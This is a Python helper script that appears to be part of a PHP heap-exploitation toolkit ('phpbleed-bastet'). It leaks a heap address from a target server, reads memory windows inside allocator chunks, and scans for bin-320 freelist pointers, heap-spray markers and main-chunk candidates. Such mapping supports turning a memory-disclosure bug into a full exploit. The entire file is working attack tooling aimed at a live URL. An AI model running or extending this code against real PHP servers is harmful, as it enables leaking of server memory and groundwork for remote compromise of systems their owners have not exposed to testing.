#!/usr/bin/env python3
"""Where does the bin-320 freelist head actually live on a lane?
Heap-leaks, reads the chunk+0x40 window, then:
  1. prints the window's first 0x120 bytes as qwords,
  2. lists every 320-grid pointer in the window (no range filter),
  3. verifies spray-slot candidates around each such pointer,
  4. lists 2MB-aligned pointers in the window (main-chunk / chunk-list
     candidates) and scans each candidate chunk's +0x40 window the same
     way. All reads are anchored INSIDE a chunk (no out-of-mapping reads:
     safe for single-process SAPIs like php -S).

Usage: diag_chunkwalk.py http://127.0.0.1:PORT/
"""
import importlib.util
import struct
import sys

spec = importlib.util.spec_from_file_location('pb', 'phpbleed-bastet.py')
pb = importlib.util.module_from_spec(spec)
spec.loader.exec_module(pb)


def window(t, chunk):
    r = pb.read_at(t, chunk + 0x40, timeout=5)
    if r is None:
        return None
    return r  # (slen, data)


def scan(t, chunk, wdata, label):
    print(f"--- {label} (chunk 0x{chunk:x}, window len={len(wdata)}) ---")
    grid, aligned = [], []
    for off in range(8, min(len(wdata), 0x1B8) - 7, 8):
        p = struct.unpack_from('<Q', wdata, off)[0]
        if 0x10000 < p <= pb.ADDR_MAX if hasattr(pb, 'ADDR_MAX') else False:
            pass
        if p <= 0x10000 or p > 0x0000FFFFFFFFFFFF:
            continue
        if p % 320 == 0:
            grid.append((off, p))
        if p % 0x200000 == 0:
            aligned.append((off, p))
    print(f"  320-grid pointers: {[(hex(o), hex(p)) for o, p in grid]}")
    print(f"  2MB-aligned pointers: {[(hex(o), hex(p)) for o, p in aligned]}")
    for off, free16 in grid:
        for cand in (free16 - 0x140, free16, free16 - 0x280,
                     free16 + 0x140, free16 + 0x280):
            r = pb.read_at(t, cand, timeout=4)
            if r is None:
                print(f"  [w{hex(off)}] cand 0x{cand:x}: no response")
                continue
            vlen, vdata = r
            mark = " <<< SPRAY" if (vlen == pb.SPRAY_LEN and
                                    vdata[8:12] == b'\x00\x00\xbb\xbb') else ""
            print(f"  [w{hex(off)}] cand 0x{cand:x}: len={vlen}{mark}")
    return aligned


def main(url):
    t = pb.Target(url)
    hr = pb.heap_leak(t)
    if not hr:
        print("heap leak failed")
        return 1
    print(f"heap_ref = {hr:#x}")
    chunk0 = hr & ~0x1FFFFF
    r = window(t, chunk0)
    if r is None:
        print("chunk0 window read failed")
        return 1
    slen, wdata = r
    print(f"chunk0 window: slen={slen} len={len(wdata)}")
    show = min(len(wdata), 0x120)
    for off in range(0, show, 16):
        q0, q1 = struct.unpack_from('<QQ', wdata, off)
        print(f"  +0x{off:03x}: {q0:#018x} {q1:#018x}")
    aligned = scan(t, chunk0, wdata, 'chunk0 (leaked arData chunk)')
    # try 2MB-aligned candidates as potential MAIN chunks (heap struct home)
    tried = {chunk0}
    for off, p in aligned:
        c = p & ~0x1FFFFF
        if c in tried:
            continue
        tried.add(c)
        r = window(t, c)
        if r is None:
            print(f"--- chunk 0x{c:x} (from window ptr @0x{off:x}): unreadable")
            continue
        scan(t, c, r[1], f'chunk 0x{c:x} (main-chunk candidate, from window @0x{off:x})')
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1]))
